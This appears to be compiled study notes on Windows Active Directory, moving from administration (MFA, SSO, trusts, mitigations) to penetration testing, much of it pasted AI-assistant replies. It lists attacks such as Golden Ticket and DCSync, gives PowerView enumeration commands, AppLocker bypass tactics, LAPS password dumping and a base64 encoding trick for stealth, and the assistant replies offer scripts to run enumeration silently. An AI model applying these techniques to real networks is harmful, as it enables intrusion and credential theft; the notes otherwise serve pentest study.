**Windows Active Directory (AD) on Windows Server 2019, 2022, 2025**

**What is Active Directory?**\
Active Directory is Microsoft’s centralized directory service used in
Windows environments to manage users, devices, groups, and network
resources. It provides authentication, authorization, and policy
enforcement for domain-joined computers and users.

**How to Configure Multi-Factor Authentication (MFA) in Active
Directory?**

- Native Active Directory (on-premises) does not include built-in MFA.

- MFA is typically implemented by integrating AD with **Azure Active
  Directory (Azure AD)** and enabling Azure MFA.

- Alternatively, third-party solutions (e.g., Duo, RSA) can be
  integrated with AD via LDAP or RADIUS for MFA enforcement.

- To enable MFA, users are usually required to provide a second
  verification method (e.g., phone app, SMS, hardware token) during
  login.

**How to Configure Single Sign-On (SSO) in Active Directory?**

- SSO is commonly enabled using **Kerberos authentication**, which is
  built into AD for domain-joined Windows devices.

- When a user logs into a Windows domain-joined device, a Kerberos
  ticket is issued and used to authenticate to other resources without
  re-entering credentials.

- For web or cloud apps, SSO can be configured using **Active Directory
  Federation Services (AD FS)** or by integrating with Azure AD for
  federated SSO with protocols like SAML or OAuth.

**How to Register a Device in Active Directory?**

- Devices can be registered (joined) to an AD domain by adding them to
  the domain via **System Properties \> Computer Name \> Change \>
  Domain** on Windows machines.

- This process requires domain credentials and allows devices to be
  managed by Group Policy and authenticated via AD.

- For hybrid environments, devices can be **Azure AD joined** or **Azure
  AD registered** to enable cloud-based device management and
  conditional access policies.

If you want, I can provide step-by-step instructions or recommended best
practices for each of these!

Here’s a corrected and concise summary of your points on accessing
Active Directory (AD) from Linux/Mac and why local Windows accounts are
easier to compromise than AD accounts:

**Accessing Active Directory from Linux or Mac**

- Although Active Directory is a Windows service, it can be accessed
  from Linux and Mac systems.

- AD relies on protocols like **SMB (Server Message Block)** for file
  and resource sharing.

- Linux and Mac users can use the **Samba** suite to interact with AD
  resources, including shared files, printers, and, in some cases, even
  domain membership.

- Samba enables non-Windows systems to authenticate against AD and
  access network shares.

**Why Is It Easier to Break Into a Local Windows Account than an AD
Account?**

- **Local Windows accounts** often retain legacy security features and
  weaker password hashing (such as LM hashes), which can be exploited
  more easily.

- Local accounts authenticate on the individual machine itself, which
  attackers can target directly if they gain physical or administrative
  access.

- **Active Directory accounts** are centrally authenticated by domain
  controllers, adding layers of network security and monitoring.

- Compromising AD accounts typically requires breaching the domain
  controller or intercepting network authentication, which is generally
  more difficult than local account compromise.

# Active Directory Tools

- NTFS Permissions Reporter – Easily audit folder permissions and see
  who has permissions to what.

- AD Cleanup Tool – Find inactive user and computer accounts, bulk move
  and disable accounts.

- Export Group Membership – Get all users group membership and export to
  a CSV file.

- User Unlock & lockout troubleshooter – Quickly find all locked users
  and the source of account lockouts.

- Bulk User Updater – Bulk update user account properties. Huge time
  saver

 

 

# 2-Way Trust in AD

**Two-way trust in Active Directory**

- Two-way trust in Active Directory lets users in two domains access
  resources in each other's domain. Imagine it as a bridge for users and
  resources to flow between two domains.

- Users in either domain can access resources in another domain.

- In a two-way trust, each domain trusts the other domain to
  authenticate its users and groups

- Users in one domain can log on to computers in the other domain using
  their own domain credentials, and they can also access resources in
  the other domain, such as shared files and printers.

**Benefits**:

- Improved resource sharing and collaboration: Two-way trusts allow
  users in one domain to access resources in the other domain

- Reduced administrative overhead by eliminating the need for users to
  create separate accounts in each domain.

 

**Risks:**

- Increased complexity: Two-way trusts can increase the complexity of
  your Active Directory environment.

- Increased security risk: Two-way trusts can increase the security risk
  of your Active Directory environment if they are not managed properly.

- Overall, two-way trusts can be a valuable tool for organizations that
  need to share resources with each other. However, it is important to
  carefully consider the benefits and drawbacks of two-way trusts before
  implementing them in your organization.

 

**Cyber-attack tactics:**

- Increased attack surface of both domains, making them more vulnerable
  to cyberattacks. Attackers can exploit this trust relationship to gain
  access to resources in either domain.

- Lateral Movement: Once an attacker gains access to one domain, they
  can leverage the two-way trust to move laterally within the other
  domain, escalating their privileges and gaining access to even more
  sensitive data and systems.

- Misconfigurations: Improper configuration of trust relationships can
  lead to unintended consequences, such as granting excessive access
  permissions or creating security loopholes that attackers can exploit.

- Complexity Management: Managing multiple trust relationships can
  become increasingly complex as the number of domains grows. This
  complexity can make it challenging to maintain proper security posture
  and identify potential vulnerabilities.

- Replication of Security Issues: If one domain has security
  vulnerabilities, those vulnerabilities can be replicated to the other
  trusted domain, increasing the overall security risk.

- Increased Denial-of-Service (DoS) Attack Potential: Two-way trusts can
  be exploited to launch DoS attacks by flooding one domain with
  authentication requests, causing performance degradation or service
  outages.

 

**General Compensating controls to mitigate risks**

- Implement Least Privileges to perform their jobs, reducing potential
  impact of compromised account.

- Regularly Assess Trust Relationships to ensure they are still aligned
  with business requirements and security policies.

- Monitor and Audit Trust Activity: Implement monitoring and auditing
  mechanisms to detect suspicious activity or unauthorized access
  attempts within the trusted domains.

- Segment Networks: Segment networks to isolate critical resources and
  limit the potential spread of attacks through trusted domains.

- Implement strong password policies and multi-factor authentication
  (MFA) to protect against unauthorized access and credential theft.

- Educate employees about security risks associated with two-way trusts
  and emphasize the importance of following security protocols.

- Regularly Update Systems and Software: Keep all systems and software
  up to date with the latest security patches to minimize
  vulnerabilities that attackers can exploit.

 

**AD specific Compensating controls**

- Forest Functional Level: Ensure that both domains are operating at the
  same forest functional level (FFL). This ensures compatibility and
  consistent security features across the trusted domains.

- Domain Functional Level: Maintain the same domain functional level
  (DFL) across the trusted domains. This ensures that both domains share
  the same security features and capabilities.

- Group Policy Objects (GPOs): Implement consistent Group Policy Objects
  (GPOs) across the trusted domains to enforce uniform security policies
  and configurations.

- Account Permissions: Grant users only the minimum account permissions
  necessary to perform their tasks within the trusted domains. Avoid
  granting domain admin privileges to non-administrative users.

- Service Account Management: Manage service accounts with care,
  granting them only the minimum permissions required to perform their
  functions. Regularly review and audit service account privileges.

- Privileged Access Management (PAM): Implement a Privileged Access
  Management (PAM) solution to control and monitor privileged account
  access within the trusted domains.

- Access Control Lists (ACLs): Use ACLs to restrict access to sensitive
  resources and limit communication between domains to authorized users
  and services.

- Kerberos Constrained Delegation: Utilize Kerberos Constrained
  Delegation (KCD) to grant users the ability to perform specific tasks
  within the trusted domains without granting them full domain admin
  privileges.

- Auditing and Logging: Enable comprehensive auditing and logging for
  all trust-related activities, including authentication requests,
  access attempts, and trust relationship changes.

- Regular Security Assessments: Conduct regular security assessments to
  identify and address vulnerabilities within the trusted domains,
  paying particular attention to trust-related configurations and
  permissions.

 

 

# Use cases

## Domain Join Scenarios

**In which, AD authentication should be used?**

Active Directory (AD) authentication is ideal for scenarios where you
have a centrally managed Windows-based network environment. Here are
some key use cases:

- **Centralized User Management:** If you have many users and need to
  manage their access privileges, passwords, and group memberships
  across various Windows machines, AD provides a centralized and
  efficient way to do so.

- **Domain-Joined Devices:** When you have a network primarily
  consisting of Windows computers that need to access shared resources
  like printers, file servers, or internal applications, AD simplifies
  authentication and authorization for these resources. Users can log in
  once with their domain credentials and access these resources
  seamlessly.

- **Group Policy Management:** AD allows you to define and enforce group
  policies that configure security settings, software installations, and
  user desktop environments consistently across all domain-joined
  devices. This ensures a standardized and secure computing experience
  for all users.

- **Windows Server Integration:** Many Windows server applications and
  services rely on AD for authentication and authorization. For example,
  a domain controller in AD can authenticate users trying to access a
  web server running on another Windows machine within the domain.

**In essence, AD authentication is best suited for organizations with a
predominantly Windows infrastructure that need centralized user and
access management.** It might not be the most suitable choice for
environments with a mix of operating systems (Windows, macOS, Linux) or
those that do not require strict centralized control.

## Login AD from Linux

**How would you login to Active Directory from a Linux or Mac box?**

**Linux:**

- **Samba:** This is the most common method. You will need to install
  and configure Samba on your Linux machine. The configuration involves
  specifying the AD domain name, domain controller IP address, username,
  and password. Configure Samba for AD integration. Once configured, you
  can use the domain name - username format and password to log in to
  the domain resources like file shares or printers.

- **Third-Party Tools:** Some commercial tools like Centrify or
  Powerbroker Identity Services can be used for AD integration on Linux.
  These tools might offer additional features or simplified management
  compared to Samba.

**Mac:**

- **Built-in Directory Utility:** Apple computers have a built-in tool
  called "Directory Utility" that allows you to join a domain. You can
  launch the tool, search for your Active Directory domain, and provide
  your username and password to join. After successful binding, you can
  access domain resources using the domain name / username format and
  password.

## Windows Local Account Weakness

**On a Windows network, why is it easier to break into a local account
than an AD account?**

- **Local Accounts:** Easier to crack because they store password hashes
  directly on the local machine. Attackers with physical access can use
  tools to bypass these hashes and gain access.

- **AD Accounts:** More secure because they use Active Directory, a
  centralized authentication system. The password hash is not stored on
  the local machine, making it harder for attackers to access directly.

# References

1\.
https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/virtualdc/active-directory-domain-services-overview

2\. https://www.paessler.com/it-explained/active-directory

3\. https://www.cyberark.com/what-is/active-directory/

4\.
https://www.hackthebox.com/blog/active-directory-penetration-testing-cheatsheet-andguid

# AD PenTest

- Active Directory (AD) is a Microsoft Windows Server-based directory
  service.

- Active Directory Domain Services (AD DS) manages directory data
  storage and makes it accessible to network users and administrators.

- For instance, AD DS maintains information about user accounts, like as
  user names, passwords, and phone numbers, and allows other legitimate
  users on the same network to access data.

- Since the Active Directory is the controlling center in a network
  makes its jewel assets for an organization.

- Microsoft stated that more than 95 million AD accounts come under
  attack daily.

- In 2021, Azure Active Directory alone saw more than 25.6 billion brute
  force attacks.

- Unfortunately, too many of these attacks are succeeding.

- One of the primary reasons for this is that AD is notoriously
  difficult to secure.

Threats to Active Directory

**Default Security Settings**:

Microsoft built a set of predetermined, default security settings for
AD. These security settings may not be suitable for the needs of your
organization. Furthermore, hackers are well-versed in these default
security settings and will attempt to attack gaps and vulnerabilities.

**Inappropriate Privileged Access**:

Domain user accounts and other administrative users may have full,
privileged access to AD. Special categories of privileged accounts,
referred to as superuser accounts, are generally utilized for
administration by qualified IT personnel and offer nearly unrestricted
command execution and system changes.

**Inappropriate or Broad Access for Roles and Employees**:

Administrators can provide employees access to specific applications and
data based on their positions. Access levels are determined by the roles
assigned to individuals. It is critical to restrict access to
individuals and roles to the levels necessary for them to accomplish
their job tasks.

**Unpatched Vulnerabilities**:

Cybercriminals can swiftly target unpatched apps, operating systems, and
firmware on AD Servers, gaining a key first foothold in your
environment.

**Missing Monitoring Alerts**:

To better prevent or disrupt illegal access attempts in the future, IT
managers must be informed of such incidents. If you don't have a clear
Windows audit trail, it's impossible to tell legitimate and malicious
access attempts apart, as well as any changes

• Module 1 - Active Directory Enumeration and Local Privilege
Escalation - Enumerate useful information like users, groups, group
memberships, computers, user properties, trusts, ACLs etc. to map attack
paths! - Learn and practice different local privilege escalation
techniques on a Windows machine. - Hunt for local admin privileges on
machines in the target domain using multiple methods. - Abuse enterprise
applications to execute complex attack paths that involve bypassing
antivirus and pivoting to different machines.

• Module 2 – Lateral Movement, Domain Privilege Escalation and
Persistence - Learn to find credentials and sessions of high privileges
domain accounts like Domain Administrators, extracting their credentials
and then using credential replay attacks to escalate privileges, all of
this with just using built-in protocols for pivoting. - Learn to extract
credentials from a restricted environment where application whitelisting
is enforced. Abuse derivative local admin privileges and pivot to other
machines to escalate privileges to domain level. - Understand the
classic Kerberoast and its variants to escalate privileges. - Understand
and exploit delegation issues. - Learn how to abuse privileges of
Protected Groups to escalate privileges. - Abuse Kerberos functionality
to persist with DA privileges. Forge tickets to execute attacks like
Golden ticket and Silver ticket to persist. - Subvert the authentication
on the domain level with Skeleton key and custom SSP. - Abuse the DC
safe mode Administrator for persistence. - Abuse the protection
mechanism like AdminSDHolder for persistence.

• Module 3 - Domain Persistence, Dominance and Escalation to Enterprise
Admins - Abuse minimal rights required for attacks like DCSync by
modifying ACLs of domain objects. - Learn to modify the host security
descriptors of the domain controller to persist and execute commands
without needing DA privileges. - Learn to elevate privileges from Domain
Admin of a child domain to Enterprise Admins on the forest root by
abusing Trust keys and krbtgt account. - Execute intra-forest trust
attacks to access resources across forest. - Abuse database links to
achieve code execution across forest by just using the databases.

• Module 4 - Defenses – Monitoring, Architecture Changes, Bypassing
Advanced Threat Analytics and Deception - Learn about useful events
logged when the discussed attacks are executed. - Learn briefly about
architecture changes required in an organization to avoid the discussed
attacks. We discuss Temporal group membership, ACL Auditing, LAPS, SID
Filtering, Selective Authentication, credential guard, device guard
(WDAC), Protected Users Group, PAW, Tiered Administration and ESAE or
Red Forest. - Learn how Microsoft's Advanced Threat Analytics and other
similar tools detect domain attacks and the ways to avoid and bypass
such tools. - Understand how Deception can be effective deployed as a
defense mechanism in AD.

Active Directory Default Local Accounts

https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-default-user-accounts#administrator-account

- Administrator account

- Guest account

- HelpAssistant account (installed with a Remote Assistance session)

- KRBTGT account

Common Tools Used in Privilege Abuse & AD Pentesting

- **Mimikatz:** Extract credentials, abuse SeDebugPrivilege, impersonate
  tokens, create golden tickets.

- **PowerView / BloodHound:** Enumerate privileges, detect delegation
  abuse, identify high-value targets.

- **Rubeus:** Kerberos abuse, delegation, ticket forging.

- **SharpHound:** Collect AD info for privilege escalation and lateral
  movement.

- **Impacket:** Execute remote commands and privilege escalation tools.

- **PsExec / WinRM:** Remote command execution leveraging privilege
  abuse.

Typical Vulnerabilities Exploited

- Excessive privileges granted by default or through misconfiguration
  (e.g., local admins having SeDebugPrivilege).

- Weak or absent delegation controls (SeEnableDelegationPrivilege).

- Improper ACLs allowing take ownership or backup privilege abuse.

- Unrestricted symbolic link creation used to bypass file system
  protections.

- Security log manipulation via SeSecurityPrivilege.

- Missing monitoring/detection on privilege abuse activities.

Security Risk Severity and Impact

- Privileges like **SeDebugPrivilege**, **SeImpersonatePrivilege**,
  **SeEnableDelegationPrivilege**, and **SeSecurityPrivilege** pose
  **Critical** risks due to their potential to lead to full domain
  compromise and stealthy persistence.

- Privileges like **SeBackupPrivilege**, **SeRestorePrivilege**, and
  **SeTakeOwnershipPrivilege** pose **High** risks enabling data
  exfiltration and unauthorized access.

- Others like **SeShutdownPrivilege** and
  **SeCreateSymbolicLinkPrivilege** pose **Medium** risk mostly for DoS
  or bypass techniques.

Impact ranges from local privilege escalation, lateral movement,
credential theft, data exfiltration, to complete domain takeover and
stealthy persistence.

## Mitigations & Defense Strategies

- Limit assignment of powerful privileges (especially SeDebug,
  SeImpersonate, SeEnableDelegation) to trusted admins only.

- Use **Group Policy** and **Restricted Groups** to enforce least
  privilege.

- Enable **Event Logging** and **Security Monitoring** for privilege
  abuse activities.

- Harden delegation settings in AD (disable unconstrained delegation).

- Regularly audit whoami /priv and AD group memberships.

- Use tools like **BloodHound** for privilege graph analysis and
  continuous monitoring.

- Apply **Patch Management** and **Driver Signing** policies to prevent
  unauthorized driver loads.

------------------------------------------------------------------------

If you want, I can generate detailed command scripts or BloodHound
queries for privilege enumeration and exploitation. Would you like that?

Sure! Here's a **corrected, clear, and concise summary and rewrite** of
your content on **Active Directory offensive enumeration** with key
steps, commands, and typical weaknesses used in external and internal
penetration testing against Active Directory and Microsoft Entra ID:

------------------------------------------------------------------------

**Offensive Enumeration in Active Directory & Microsoft Entra ID**

*By Hernan Rodriguez — Senior Offensive Cybersecurity Specialist*

------------------------------------------------------------------------

**Overview**

Active Directory (AD) and Microsoft Entra ID (Azure AD) are core
identity and access management systems in many organizations.
Penetration testing and red teaming on these systems involve detailed
enumeration to identify assets, user accounts, configurations, and
potential vulnerabilities.

This guide summarizes **internal enumeration using built-in Windows
tools and PowerShell** without relying on external tools, focusing on
real commands, weaknesses exploited, and step-by-step procedures.

------------------------------------------------------------------------

**Preparation: Environment Setup & Time Control**

During pentesting, it’s important to track the timing of your actions
for audit and operational control. You can customize your PowerShell
prompt to show timestamps:

New-Item \$Profile -ItemType file -Force

function prompt { "\$(Get-Date) \| PS \$(Get-Location) \> " }

------------------------------------------------------------------------

**Step 1: Enumerate Domain Computers**

Identify all enabled computers in the domain. Note that not all devices
are Windows-based; organizations may have Linux, macOS, and other OSes
joined to AD.

Get-ADComputer -Filter {Enabled -eq \$TRUE}

To export results for further analysis:

Get-ADComputer -Filter {Enabled -eq \$TRUE} \| Export-Csv -Path
report.csv -NoTypeInformation

------------------------------------------------------------------------

**Step 2: Filter by Operating System**

Focus on specific OS versions, especially outdated or unsupported ones
with known vulnerabilities (e.g., Windows 7, XP):

Get-ADComputer -Filter {Enabled -eq \$TRUE -and OperatingSystem -like
"\*Windows 10\*"}

*Note:* Finding legacy systems (Windows 7, XP, 2000) is common in
audits; these are often critical weak points.

------------------------------------------------------------------------

**Step 3: Retrieve Detailed Properties of a Target Computer**

Get all properties of a specific device, useful for identifying last
logged-in users, patch levels, or configuration details:

Get-ADComputer -Identity PC-01 -Properties \*

This output helps identify potential footholds or vulnerable machines to
target next.

------------------------------------------------------------------------

**Common Weaknesses Exploited During Enumeration**

- **Legacy Systems**: Unsupported Windows versions without patches.

- **Excessive Permissions**: Over-permissioned users/computers.

- **Poorly Managed Service Accounts**: Weak or reused passwords.

- **Unrestricted Device Join Policies**: Allowing unauthorized devices.

- **Lack of Segmentation**: Broad network trust allowing lateral
  movement.

- **Weak Group Policy Objects (GPOs)**: Misconfigurations exploitable
  for privilege escalation.

------------------------------------------------------------------------

**Summary of Commands and Use Cases**

| **Purpose** | **Command Example** |
|----|----|
| List all enabled computers | Get-ADComputer -Filter {Enabled -eq \$TRUE} |
| Export computers to CSV | \`Get-ADComputer -Filter {Enabled -eq \$TRUE} |
| Find computers by OS | Get-ADComputer -Filter {Enabled -eq \$TRUE -and OperatingSystem -like "\*Windows 10\*"} |
| Get detailed properties of a computer | Get-ADComputer -Identity PC-01 -Properties \* |

------------------------------------------------------------------------

**Additional Notes**

- Similar enumeration applies to Microsoft Entra ID (Azure AD), but
  usually through Azure CLI, Microsoft Graph API, or PowerShell modules
  like AzureAD and Microsoft.Graph.

- Enumeration is a critical phase to understand the attack surface,
  identify vulnerable hosts/users, and plan privilege escalation or
  lateral movement.

------------------------------------------------------------------------

If you want, I can also help draft internal and external penetration
testing steps specifically for Microsoft Entra ID or provide examples
for Azure AD enumeration commands and exploitation techniques. Would you
like that?

# Reconnaissance

Attackers gather detailed info about the AD environment, users, and
network.

- Techniques:

  - Querying AD using tools like ldapsearch, BloodHound, or PowerShell
    (Get-ADUser, Get-ADComputer).

  - Enumerating domain controllers, users, groups, and trust
    relationships.

  - Scanning network ports related to AD services (e.g., LDAP - 389,
    Kerberos - 88).

  - Harvesting usernames and domain info from public sources or social
    engineering.

**Reconnaissance (for tools like CeWL and Cupp)**

These tools are used to **gather wordlists or profile-based passwords**
from public-facing sources.

- **CeWL**: Crawls websites to generate custom wordlists from visible
  content (useful for targeted dictionary attacks).

- **Cupp** (Common User Passwords Profiler): Generates password lists
  based on personal info (name, birthday, company, etc.).

- **Crunch**: Generates wordlists with custom rules (e.g., charset,
  length).

🡒 These are used **before** the attack to craft targeted or optimized
password lists.

The password-related attack techniques you've listed are primarily used
in the **early to middle stages of an AD compromise**, especially for
**initial access, privilege escalation, or lateral movement**. Here's a
detailed breakdown based on the **Cyber Kill Chain (Attack Lifecycle)**:

**✅ Stage 1: Reconnaissance**

Some techniques are used **before** the actual attack to prepare or
gather data:

| **Technique** | **Purpose** |
|----|----|
| **Social Engineering** | Collects password clues from human behavior (phishing, pretexting, etc.) |
| **Building Rainbow Tables** | Prepares lookup tables offline to speed up future hash cracking |

**✅ Stage 3: Delivery**

If the attacker uses **malicious data hosting or botnet
infrastructure**, it often falls into this phase:

| **Technique** | **Purpose** |
|----|----|
| **Hosting Malicious Data** | Delivers malicious payloads, phishing pages, or scripts to capture creds |
| **Botnet Command and Control** | Infrastructure to deliver brute-force attacks or harvest credentials |

**✅ Stage 4: Exploitation**

**Most password-based attacks occur in this stage**, where the attacker
is actively trying to compromise accounts and gain access.

| **Technique** | **Purpose** |
|----|----|
| **Password Guessing** | Attempts logins using guessed passwords (online brute-force) |
| **Brute Force Attack** | Tries all possible passwords until one works |
| **Dictionary Attack** | Tests passwords from a predefined wordlist |
| **Password and Key Cracking** | Attempts to decrypt or reverse password hashes offline |
| **Rainbow Table Attack** | Uses precomputed hashes to quickly match against stolen hash data |
| **CAPTCHA Solving** | Bypasses protections on login forms to automate brute-force attacks |
| **Launching Dynamic Attack Points** | May refer to distributed attacks or using multiple nodes for brute-forcing |
| **"Exploits Already Exist"** | Using known exploits to capture passwords from memory or config files |

**✅ Stage 5: Installation / Actions on Objectives**

After credentials are cracked or accounts are compromised, they can be
used to **establish persistence or escalate control**.

| **Technique** | **Purpose** |
|----|----|
| **Use of Cracked Credentials** | Lateral movement, privilege escalation, or persistence in AD |
| **Installing Backdoors (not listed explicitly here)** | Often follows successful credential attacks to retain access |

**🔐 Defense Summary (Mapped to Prevention)**

| **Defense** | **Helps Prevent** |
|----|----|
| **Password Complexity** | Dictionary, brute-force, and rainbow table attacks |
| **Login Attempt Limiting** | Online brute-force, password guessing |
| **Two-Factor Authentication** | Prevents access even if passwords are compromised |
| **Use of Salted Hashes** | Makes rainbow tables ineffective |
| **CAPTCHA Enforcement** | Slows automated brute-force and guessing attacks |

**✅ Summary Table – Stage Mapping**

| **Attack Technique**            | **Cyber Attack Stage**          |
|---------------------------------|---------------------------------|
| Password Guessing / Brute Force | Exploitation                    |
| Dictionary Attack               | Exploitation                    |
| Rainbow Table Attack            | Exploitation (after Recon prep) |
| Password and Key Cracking       | Exploitation                    |
| Social Engineering              | Reconnaissance                  |
| Hosting Malicious Data          | Delivery                        |
| Botnet Command and Control      | Delivery / Exploitation         |
| CAPTCHA Solving                 | Exploitation                    |
| Dynamic Attack Points           | Exploitation                    |
| "Exploits Already Exist"        | Exploitation                    |

Would you like this mapped visually (e.g., attack chain diagram) or in a
table with detection/logging tips per technique?

## Discovery

- SPN Scanning (Service Principal Name enumeration)

- Data Mining (finding sensitive files, SQL server info, email data)

- User Hunting (finding hidden admins, local groups, privileges)

- Group Policy enumeration

- Active Directory Federation Services enumeration

- BloodHound reconnaissance & attack path discovery

## Enumeration

Here's a **structured, corrected, and summarized guide** to performing
**Active Directory (AD) enumeration and security control bypasses**
using **PowerView, AppLocker bypass techniques, and LAPS abuse**,
tailored for **Windows and Active Directory Penetration Testing**.

------------------------------------------------------------------------

**🔍 Windows & Active Directory Penetration Testing**

**🎯 Focus Areas:**

- AD Enumeration using PowerView

- AppLocker Evasion

- LAPS Password Access and Abuse

------------------------------------------------------------------------

**📚 Summary Overview**

| **Category** | **Details** |
|----|----|
| **Techniques** | Reconnaissance, Enumeration, Defense Evasion, Credential Access |
| **Tactics (MITRE)** | T1087, T1081, T1069, T1003, T1055, T1112, T1140 |
| **Tools Used** | PowerView, Invoke-ShareFinder, LAPSToolkit, LOLBAS utilities, AppLocker inspection |
| **Vulnerabilities** | Weak ACLs, misconfigured GPOs, excessive LAPS reader rights, improper AppLocker configs |
| **Risk Severity** | **High** – Enables attacker to discover and abuse high-value domain assets and credentials |
| **Impact** | Lateral movement, privilege escalation, credential theft, and defense evasion |

------------------------------------------------------------------------

**🧪 Enumeration & Exploitation Steps**

------------------------------------------------------------------------

**🔹 1. Basic AD Enumeration (PowerView)**

**🔸 Enumerate Domain Users:**

Get-NetUser \| Select -ExpandProperty cn

**🔸 List All Computers:**

Get-NetComputer

**🔸 List All Domains in Forest:**

Get-NetForestDomain

**🔸 Enumerate Domain & Forest Trusts:**

Get-NetDomainTrust

Get-NetForestTrust

**🔸 Get Domain Admins Group Info & Members:**

Get-NetGroup -GroupName "Domain Admins"

Get-NetGroupMember -GroupName "Domain Admins" \| Select name

**🔸 Enumerate Organizational Units (OUs):**

Get-NetOU -FullData

**🔸 Get Computers in a Specific OU:**

Get-NetOU -OUName "StudentMachines" \| %{ Get-NetComputer -ADSPath
\$\_.distinguishedname }

**🔹 2. GPO Enumeration**

**🔸 List GPOs Linked to OUs:**

Get-NetOU \*student\* \| Select -ExpandProperty gplink

**🔸 Get Specific GPO by Name or GUID:**

Get-NetGPO -Name "{GPO_GUID_HERE}"

**🔸 Check Restricted Groups Pushed via GPOs:**

Get-NetGPOGroup

------------------------------------------------------------------------

**🔹 3. ACL and Permission Auditing**

**🔸 Check ACL for Sensitive Groups:**

Get-ObjectACL -SamAccountName "Domain Admins" -ResolveGUIDs

**🔸 Identify Interesting ACLs (Incoming):**

Find-InterestingDomainAcl \| Select IdentityReferenceName,
ActiveDirectoryRights

**🔸 Filter ACLs for Specific Users/Groups:**

Find-InterestingDomainAcl -ResolveGUIDs \| ? {
\$\_.IdentityReferenceName -like "\*admin\*" }

------------------------------------------------------------------------

**🔐 AppLocker Evasion Techniques**

**🔸 Check AppLocker Policy:**

Get-AppLockerPolicy -Effective \| Select -ExpandProperty RuleCollections

**🔸 Common Bypass Tactics:**

| **Strategy** | **Description** |
|----|----|
| **LOLBAS** | Use trusted signed Windows binaries to proxy execution (rundll32, mshta, wmic) |
| **C:\Windows Subfolders** | Drop payload in C:\Windows\Tasks or Temp if writable |
| **Alternate Data Streams (ADS)** | Write a script to a file stream: echo \<js\> \> legit.txt:script.js |
| **DLL Proxy Execution** | Rename EXE to DLL and use rundll32 |
| **HTA or XSL Execution** | Use mshta file.hta or wmic process call create "msxml.xsl" |

------------------------------------------------------------------------

**🔓 LAPS Exploitation**

LAPS stores local admin passwords in AD and restricts access via ACLs

**🔸 List LAPS-enabled Computers and Dump Passwords:**

Get-LAPSComputers

**🔸 Identify Groups with LAPS Password Access:**

Find-LAPSDelegatedGroups

🔑 If your current user is a member of one of these groups, you can
retrieve passwords and perform lateral movement.

------------------------------------------------------------------------

**🧠 Bonus: Encode One-Liner for Stealth (OpSec Safe)**

\$command = 'Get-NetUser \| Select -ExpandProperty cn'

\$bytes = \[System.Text.Encoding\]::Unicode.GetBytes(\$command)

\$encoded = \[Convert\]::ToBase64String(\$bytes)

powershell -EncodedCommand \$encoded

------------------------------------------------------------------------

**📊 Impact Summary Table**

| **Technique** | **Risk Severity** | **Impact** |
|----|----|----|
| AD Enumeration | Medium | Reveals critical domain structure |
| GPO/OU Analysis | High | Identifies privilege assignments |
| LAPS Abuse | High | Enables credential theft and escalation |
| AppLocker Evasion | High | Enables execution of payloads |
| ACL Analysis | High | May expose privilege escalation vectors |

------------------------------------------------------------------------

Would you like me to generate an **automated script module** to run
these enumeration techniques silently or integrate these with BloodHound
or SharpHound output for graph-based privilege escalation?

## Enumeration

• Active Directory Enumeration is a process of gathering information
about an Active Directory environment.

• It's a crucial step for both administrators and potentially malicious
actors (hackers) as it helps them understand the network structure,
discover vulnerabilities, and plan their actions

Enumeration may involve:

▪ Enumerating Users and Groups

▪ Enumerating Computers and Servers

▪ Enumerating Shares and Permissions

▪ Enumerating Domain Controllers

**Step 1: Enumerate Privileges of Current User / Process**

whoami /priv

or using PowerShell:

Get-Privilege -List

**Step 2: Enumerate Users with Dangerous Privileges in AD**

Using PowerView:

Get-ADUser -Filter \* -Properties userAccountControl, memberOf,
privileges \|

Where-Object { \$\_.privileges -contains "SeDebugPrivilege" }

Or BloodHound (SharpHound) to visualize privilege assignments.

**Tools for Active Directory Enumeration & Exploitation:**

- PowerShell: - PowerShell is a powerful scripting language in Windows
  that can be used to query and interact with Active Directory. - There
  are various PowerShell modules, such as Active Directory Module, that
  facilitate AD enumeration and management.

- Net Command: - The "net" command in Windows provides various
  functionalities for enumerating users, groups, shares, and other
  AD-related information.

- LDAP Enumeration Tools: - LDAP (Lightweight Directory Access Protocol)
  enumeration tools like ldapsearch can be used to query AD for
  information about users, groups, and other directory objects.

- Enum4linux: - Enum4linux is a Linux-based tool for enumerating
  information from Windows machines, including information related to
  the Active Directory domain, shares, and more.

- BloodHound: - BloodHound is a popular tool for analysing and
  visualizing Active Directory trust relationships and permissions. - It
  helps identify attack paths and potential security issues.

- Mimikatz: - A tool that can extract plaintext passwords, hashes,
  tickets, and keys from Windows systems. - It can also perform
  pass-the-hash, pass-the-ticket, overpass-the-hash, and other
  credential theft and reuse attacks

## 1. Enumerate Computers in the Domain

- Get all computers with important properties like OS, last logon, IP,
  etc.

\# Basic info for a single computer

Get-ADComputer -Identity PC-01 -Properties lastLogonDate,
operatingSystem \| Select-Object Name, lastLogonDate, operatingSystem

\# List all computers with detailed OS and IP info

Get-ADComputer -Filter \* -Properties OperatingSystem, ipv4Address,
OperatingSystemVersion, OperatingSystemServicePack \| Format-Table
-AutoSize

\# Filter computers running Windows 10 and list last logon info

Get-ADComputer -Filter {OperatingSystem -like '\*Windows 10\*'}
-Properties lastLogonDate, operatingSystem \| Select Name,
lastLogonDate, operatingSystem

\# Computers inactive for 90 days (potential targets)

\$Days = 90

\$Time = (Get-Date).AddDays(-\$Days)

Get-ADComputer -Filter {LastLogonTimeStamp -lt \$Time} -Properties
lastLogonDate \| Select Name, lastLogonDate

**2. Enumerate Users and Groups**

- Identify enabled users, new users/groups, group membership, and
  properties:

\# List all enabled users

Get-ADUser -Filter {Enabled -eq \$TRUE} \| Format-Table Name,
UserPrincipalName, Enabled

\# Export users to CSV

Get-ADUser -Filter \* -Properties SamAccountName \| Select
SamAccountName \| Export-Csv users.csv -NoTypeInformation

\# Get detailed info for a specific user

Get-ADUser kai.bel -Properties \*

\# Newly created users in last 200 days

\$When = (Get-Date).AddDays(-200)

Get-ADUser -Filter {whenCreated -ge \$When} -Properties whenCreated

\# Newly changed groups in last 30 days

\$When = (Get-Date).AddDays(-30)

Get-ADGroup -Filter {whenChanged -ge \$When} -Properties whenChanged

\# List group memberships of a user

Get-ADUser -Identity elle.maggee -Properties MemberOf \| Select-Object
-ExpandProperty MemberOf

\# View all members of the 'Administrators' group recursively

Get-ADGroupMember -Identity Administrators -Recursive

**3. Password and Logon Information**

- Important for detecting stale accounts or recent password changes:

\# Last password change date for all users

Get-ADUser -Filter \* -Properties PasswordLastSet \| Format-Table Name,
SamAccountName, PasswordLastSet

\# Users who changed password in the last 10 days

Get-ADUser -Filter \* -Properties PasswordLastSet \| Where-Object {
